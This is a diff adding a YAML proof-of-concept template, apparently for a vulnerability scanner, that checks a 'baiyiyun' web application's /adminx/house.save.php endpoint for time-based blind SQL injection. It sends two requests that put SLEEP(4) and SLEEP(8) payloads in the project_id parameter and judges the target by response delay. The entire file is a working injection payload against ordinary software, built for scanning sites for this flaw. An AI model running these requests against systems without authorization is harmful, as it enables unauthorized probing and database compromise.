@@ -1,0 +1,24 @@
+name: poc-yaml-baiyiyun-house.save.php-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /adminx/house.save.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(4)))OKTO)
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /adminx/house.save.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(8)))OKTO)
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487436&idx=1&sn=548f698533c1f2631524dd87cedc8a22&chksm=c267bafff51033e949efc22ef9a1f214413e76597188bee9c467b135a2880f7d5bf791a7ed83&token=286085064&lang=zh_CN#rd
